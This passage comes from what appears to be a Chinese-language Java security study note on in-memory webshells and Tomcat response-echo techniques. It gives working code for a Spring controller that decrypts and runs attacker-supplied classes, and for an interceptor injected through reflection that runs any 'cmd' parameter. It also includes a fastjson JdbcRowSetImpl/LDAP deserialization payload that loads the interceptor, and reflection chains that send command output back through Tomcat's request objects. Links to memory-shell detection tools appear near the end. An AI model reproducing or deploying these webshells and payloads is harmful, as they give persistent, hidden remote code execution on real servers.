                System.out.println("url已存在");
                return;
            }
        }

        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method2 = InjectToController.class.getMethod("test");
        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/malicious");
        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }

    public InjectToController(String aaa){

    }

    // controller 指定的处理方法
    public Object test() throws Exception {
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        HttpSession session = (HttpSession) ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getSessionMutex();

        if (request.getMethod().equals("POST")) {
            session.putValue("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

            InjectToController injectToController = new InjectToController(ClassLoader.getSystemClassLoader());
            String base64String = request.getReader().readLine();
            byte[] bytesEncrypted = new BASE64Decoder().decodeBuffer(base64String);
            byte[] bytesDecrypted = c.doFinal(bytesEncrypted);
            Class newClass = injectToController.g(bytesDecrypted);

            Map<String, Object> pageContext = new HashMap<>();
            pageContext.put("session",session);
            pageContext.put("request",request);
            pageContext.put("response",response);
            newClass.newInstance().equals(pageContext);

        }

        return request;
    }
}
```

特别需要注意的是红框内的`ClassLoader.getSystemClassLoader()`，如果随意给定某个继承自ClassLoader的类，可能会出现报错`java.lang.LinkageError : attempted duplicate class definition for name`。这是因为需要使用getSystemClassLoader()获取创建ClassLoader时需要添加委派父级([参考](https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror))。

成功

![image-20220214151021192](img/image-20220214151021192.png)![image-20220214151021192](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214151021192.png?lastModify=1646033842)

来自： [https://www.cnblogs.com/bitterz/p/14820898.html#23-%E6%B5%8B%E8%AF%95](https://www.cnblogs.com/bitterz/p/14820898.html#23-测试)

## Spring mvc Interceptor内存马

#### 基础拦截器

Spring mvc 的拦截器也可以用于注入内存马，关键点在于找到拦截器是如何被触发以及如何动态添加拦截器。

先写个 demo 

controller:

```
package com.test.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TestController {
    @GetMapping("/test")
    public String test(){
        System.out.println("TestController.test");
        return "OK";
    }
}
```

interceptor : 

```
package com.test.config;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MyInterceptor implements HandlerInterceptor {
    // return true; 执行下一个拦截器，放行
    // return false;  不执行下一个拦截器，拦截
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("处理前");
        if(request.getQueryString() !=null)
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        System.out.println("处理后");
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("清理");
    }
}
```

web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>dispatcherServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc.xml</param-value>
        </init-param>
    </servlet>

    <servlet-mapping>
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

</web-app>
```

springmvc.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">

    <context:component-scan base-package="com.test"/>
    <mvc:default-servlet-handler />

    <!-- 配置视图解析器 -->
    <bean id="internalResourceViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/jsp/"/>
        <property name="suffix" value=".jsp"/>
    </bean>

    <mvc:annotation-driven/>

    <!-- 拦截器配置 -->
    <mvc:interceptors>
        <mvc:interceptor>
            <!-- 包括这个请求下面的所有请求 -->
            <mvc:mapping path="/**"/>
            <bean class="com.test.config.MyInterceptor"/>
        </mvc:interceptor>
    </mvc:interceptors>

</beans>
```

效果：

![image-20220214154901915](img/image-20220214154901915.png)![image-20220214154901915](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214154901915.png?lastModify=1646033842)

![image-20220214154942487](img/image-20220214154942487.png)![image-20220214154942487](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214154942487.png?lastModify=1646033842)

#### 拦截器调用链

断点打在`MyInterceptor` 类中，调试

```
preHandle:14, MyInterceptor (com.test.config)
applyPreHandle:136, HandlerExecutionChain (org.springframework.web.servlet)
doDispatch:1034, DispatcherServlet (org.springframework.web.servlet)
doService:942, DispatcherServlet (org.springframework.web.servlet)
processRequest:1005, FrameworkServlet (org.springframework.web.servlet)
doGet:897, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:882, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:232, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:194, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```

关键点在`doDispatch` 方法，

先通过 `getHandler` 方法获取了 mappedHandler 对象，然后调用 `mappedHandler.applyPreHandle` 方法，

![image-20220214170439137](img/image-20220214170439137.png)![image-20220214170439137](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214170439137.png?lastModify=1646033842)

applyPreHandler 方法就是依次调用每个 interceptor 实例的 preHandl方法，实际上就进入了前面写好的`MyInterceptor#preHandle` 方法

![image-20220214170915614](img/image-20220214170915614.png)![image-20220214170915614](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214170915614.png?lastModify=1646033842)

#### 拦截器是如何被添加的

跟进 mappedHandler 的获取过程，先是调用了`getHandler`方法

```
mappedHandler = this.getHandler(processedRequest);
```

跟进，遍历`this.handlerMappings` 获取 HandlerMapping 实例，然后在调用 `getHandler` 方法

![image-20220214171538158](img/image-20220214171538158.png)![image-20220214171538158](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214171538158.png?lastModify=1646033842)

![image-20220214171432008](img/image-20220214171432008.png)![image-20220214171432008](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214171432008.png?lastModify=1646033842)

这里断点跟进getHandler函数处，会发现实际上调用了org.springframework.web.servlet.handler.AbstractHandlerMapping类中的getHandler方法

![image-20220214171724172](img/image-20220214171724172.png)![image-20220214171724172](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214171724172.png?lastModify=1646033842)

再跟进 `getHandlerExecutionChain` 方法，发现其中会遍历 `this.adaptedInterceptors` 数组，并判断获取的 interceptor 实例是不是 MappedInterceptor 类的实例对象，而 MappedInterceptor 类就是对拦截器 HandlerInterceptor 接口的实现，所以前面定义的 MyInterceptor 会被加入到 chain 中返回，

![image-20220214171856423](img/image-20220214171856423.png)![image-20220214171856423](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214171856423.png?lastModify=1646033842)

![image-20220214172229171](img/image-20220214172229171.png)![image-20220214172229171](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214172229171.png?lastModify=1646033842)

至此，拦截器的加载和调用流程就清楚了， 动态添加拦截器的话，只需要在org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象的**adaptedInterceptors数组中添加恶意interceptor实例对象即可！**

```
private final List<HandlerInterceptor> adaptedInterceptors = new ArrayList();
```

所以关键点在于找到 `AbstractHandlerMapping` 的类实例对象，

CTRL+ALT+B找到所有AbstractHandlerMapping的子类，并在beanFactory的beanDefinitionNames中找到它的实例

```
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
```

![image-20220214173429963](img/image-20220214173429963.png)![image-20220214173429963](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214173429963.png?lastModify=1646033842)

因此可以通过context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入

#### 实践

继续使用之前的 spring mvc controller 内存马的 fastjson 反序列化的代码例子，

```
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

public class MyInterceptor implements HandlerInterceptor {
    public MyInterceptor() throws Exception {
        // 获取 context
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
        // 从 context 中获取 AbstractHandlerMapping 对象
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        // 反射获取 adaptedInterceptors 属性
        Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        List<Object> list = (List<Object>) field.get(abstractHandlerMapping);
        // 避免重复添加
        for (int i = list.size()-1;i>0;i--){
            if(list.get(i) instanceof MyInterceptor){
                System.out.println("已经添加过 MyInterceptor 实例了");
                return;
            }
        }
        // 用另一个构造函数避免进入死循环
        MyInterceptor myInterceptor = new MyInterceptor("aaa");
        // 添加全局 interceptor
        list.add(myInterceptor);
    }
    public MyInterceptor(String  aaa){

    }


    @Override
    public boolean preHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o) throws Exception {
        String cmd = httpServletRequest.getParameter("cmd");
        if (cmd != null){
            Runtime.getRuntime().exec(cmd);
            return true;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {

    }
}
```

将编译好的类放在 web 目录，

payload

```
jsonstr={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/MyInterceptor","autoCommit":true}
```

![image-20220214180342708](img/image-20220214180342708.png)![image-20220214180342708](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214180342708.png?lastModify=1646033842)

## Java agent 内存马注入

## 中间件内存马注入

https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g















## 内存马学习

https://github.com/bitterzzZZ/MemoryShellLearn

## 内存马查杀

https://github.com/alibaba/arthas

https://arthas.aliyun.com/doc/quick-start.html

https://github.com/LandGrey/copagent

https://github.com/c0ny1/java-memshell-scanner

https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/





http://wjlshare.com/archives/1529

https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w







https://paper.seebug.org/1441/

http://wjlshare.com/archives/1529

https://xz.aliyun.com/t/10358#toc-6

https://mp.weixin.qq.com/s/LbiMAhUdL8-K1uDjKIevJA

https://blog.csdn.net/angry_program/article/details/116661899

https://su18.org/post/memory-shell/

# 回显

## 基于全局储存的新思路 | Tomcat的一种通用回显方法研究       

**寻找request，response的关键点是寻找当前运行代码的上下文环境与 Tomcat 运行上下文环境之间的联系。**

起一个 springboot ，

```
package com.example.springboot.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Test {

    @RequestMapping("/hello")
    public String test(){
        return "hello";
    }

}
```

下断点调试。

```
test:12, Test (com.example.springboot.controller)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
doInvoke:205, InvocableHandlerMethod (org.springframework.web.method.support)
invokeForRequest:150, InvocableHandlerMethod (org.springframework.web.method.support)
invokeAndHandle:117, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)
invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)
doDispatch:1067, DispatcherServlet (org.springframework.web.servlet)
doService:963, DispatcherServlet (org.springframework.web.servlet)
processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
doGet:898, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:883, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1732, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```

在调用链中发现 Http11Processor 继承的 父类  AbstractProcessor 中有 Request 以及 Reponse 的 Field，并且都是 final 类型，也就是说赋值以后，对于对象的引用是不会改变的。**那么我们只要能够获取到这个Http11Processor就肯定可以拿到Request和Response**。

```
protected final Request request;
protected final Response response;
```

![image-20220217094553900](img/image-20220217094553900.png)![image-20220217094553900](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217094553900.png?lastModify=1646033842)

接下来往前寻找有没有哪里存储了这个`Processor` ？ 或者是哪里对于 `Processor` 的 Request 等信息进行了存储？

可以发现在之前的调用链中的 `AbstractProtocol$ConnectionHandler` 中在处理的时候就将当前的 `Processor` 的信息存储在了 global 中。

![image-20220217095045494](img/image-20220217095045494.png)![image-20220217095045494](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217095045494.png?lastModify=1646033842)

![image-20220217095133366](img/image-20220217095133366.png)![image-20220217095133366](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217095133366.png?lastModify=1646033842)

![image-20220217095347498](img/image-20220217095347498.png)![image-20220217095347498](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217095347498.png?lastModify=1646033842)

![image-20220217095509821](img/image-20220217095509821.png)![image-20220217095509821](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217095509821.png?lastModify=1646033842)

这个 `RequestGroupInfo` 类型的核心就是一个存储所有 `RequestInfo` 的 List.

![image-20220217095615806](img/image-20220217095615806.png)![image-20220217095615806](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217095615806.png?lastModify=1646033842)

简化来说，下面两句的含义为 将 rq 存放在 this.global 中，而 rq 中有 Request 字段。

```
RequestInfo rp = processor.getRequest().getRequestProcessor();
rp.setGlobalProcessor(this.global);
```

那么到现在已经有了

```
AbstractProtocol$ConnectionHandler --> global --> RequestInfo --> Request --> Response
```

在往后看调用栈，寻找有没有地方存储 `AbstractProtocol` 类（AbstractProtocol 是抽象类，所以是找继承类）。

在 `CoyoteAdapter` 的 service 方法中，发现其 connector 字段有很多关于 Request 的操作。

![image-20220217100256438](img/image-20220217100256438.png)![image-20220217100256438](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217100256438.png?lastModify=1646033842)

在 `Connector` 类中就有与 `AbstractProtocol` 有关的字段

```
protected final ProtocolHandler protocolHandler;
ProtocolHandler` 是一个接口，实现类中有 `AbstractProtocol
```

![image-20220217100730857](img/image-20220217100730857.png)![image-20220217100730857](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217100730857.png?lastModify=1646033842)

处理请求的部分就寻找结束

```
Connector --> 
AbstractProtocol$ConnectionHandler --> global --> RequestInfo --> Request --> Response
```

在 Tomcat 启动过程中有这样的方法，会将 `Connector` 放入 service 中，

![img](img/1993669-20210617000922319-918478712.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1993669-20210617000922319-918478712.png?lastModify=1646033842)

这里的 service 为 `StandardService` ，

```
StandardService -->
Connector --> 
AbstractProtocol$ConnectionHandler --> global --> RequestInfo --> Request --> Response
```

可以从`Thread.currentThread.getContextClassLoader()`里面获取`webappClassLoaderBase`，再获取上下文中的 `StandardService`。

最后调用链

```
webappClassLoaderBase --> 
ApplicationContext(getResources().getContext()) -->
StandardService -->
Connector --> 
AbstractProtocol$ConnectionHandler --> global --> RequestInfo --> Request --> Response
```

代码:

```
package com.example.springboot.controller;

import org.apache.catalina.Context;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.*;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.List;

@RestController
public class Demo {
    @RequestMapping("/demo")
    public void demo(){
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext  = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(applicationContext);

            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);

            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            AbstractProtocol abstractProtocol = (AbstractProtocol)protocolHandler.get(connector[0]);

            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class aClass : AbstractProtocol_list){
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);

                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> requestInfo_list  = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : requestInfo_list){
                        Request request1  = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();

                        //  springboot 报错
                        //  response2.getWriter().write(1111);
                        //response2.getOutputStream().write("测试回显".getBytes(StandardCharsets.UTF_8));

                        InputStream inputStream = Runtime.getRuntime().exec(request2.getParameter("cmd")).getInputStream();
                        BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
                        int b = 0;
                        while ((b = bufferedInputStream.read())!= -1){
                            response2.getOutputStream().write(b);
                        }
                    }

                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException | IllegalAccessException | NoSuchMethodException | InvocationTargetException | IOException e) {
            e.printStackTrace();
        }



    }

}
```

![image-20220217113921447](img/image-20220217113921447.png)![image-20220217113921447](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217113921447.png?lastModify=1646033842)

## Tomcat半通过回显

根据前文思路顺着堆栈一路向下查看Request和Response存储位置，只要获取到一个实例即可。

顺着思路，在`org.apache.catalina.core.ApplicationFilterChain`位置发现符合条件的变量。

![image-20220217121239692](img/image-20220217121239692.png)![image-20220217121239692](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217121239692.png?lastModify=1646033842)

寻找赋值位置，发现在这个位置对request，response进行实例的存储。但是默认为False

![image-20220217121537263](img/image-20220217121537263.png)![image-20220217121537263](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217121537263.png?lastModify=1646033842)

思路如下：

1. 反射修改 `ApplicationDispatcher.WRAP_SAME_OBJECT` ，让代码逻辑进入 if 条件
2. 初始化`lastServicedRequest`和`lastServicedResponse`两个变量，默认为null
3. 从`lastServicedResponse`中获取当前请求response，并且回显内容。

```
package com.example.springboot.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;

@RestController
public class Demo1 {
    @RequestMapping("/demo1")
    public void demo1(){
        try {
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            wrap_same_object.setAccessible(true);
            // 修改 final
            Field modifiersField  = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(wrap_same_object,wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);

            boolean aBoolean = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>)lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>)lastServicedResponse.get(null);

            wrap_same_object.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal<>());
            lastServicedResponse.set(null,new ThreadLocal<>());
            ServletResponse servletResponse = responseThreadLocal.get();
            servletResponse.getOutputStream().write("111".getBytes(StandardCharsets.UTF_8));
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException | IllegalAccessException | IOException e) {
            e.printStackTrace();
        }

    }
}
```

![image-20220217122751834](img/image-20220217122751834.png)![image-20220217122751834](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217122751834.png?lastModify=1646033842)

**局限：**

在shiro反序列化漏洞的利用中并不能成功，发现request，response的设置是在漏洞触发点之后，所以在触发漏洞执行任意java代码时获取不到我们想要的response。其原因是因为rememberMe功能的实现是使用了自己实现的filter。

https://www.cnblogs.com/nice0e3/p/14891711.html

## 挖掘回显链

**回显链其实就是通过一连串反射代码获取到 Request 对象。**

用到 [Java Object Searcher项目地址](https://github.com/c0ny1/java-object-searcher)。

> 按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过`Thread.currentThread()`或`Thread.getThreads()`获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。

将项目 jar 包作为 库文件 导入项目，

然后我们需要断点打在漏洞触发的位置，因为全局变量会随着中间件和Web项目运行被各个模块修改。而我们需要的是漏洞触发时，全局变量的状态（属性结构和值）。

接着在IDEA的`Evaluate`中编写java-object-searcher的调用代码，来搜索全局变量。

```
//设置搜索类型包含Request关键字的对象
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("Request").build());
//定义黑名单
List<Blacklist> blacklists = new ArrayList<>();
blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
// 设置黑名单
searcher.setBlacklists(blacklists);
//打开调试模式,会生成log日志
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path("结果保存的绝对路径");
searcher.searchObject();
```

![image-20220217134502935](img/image-20220217134502935.png)![image-20220217134502935](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217134502935.png?lastModify=1646033842)

使用这条来测试

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [3] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
        ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
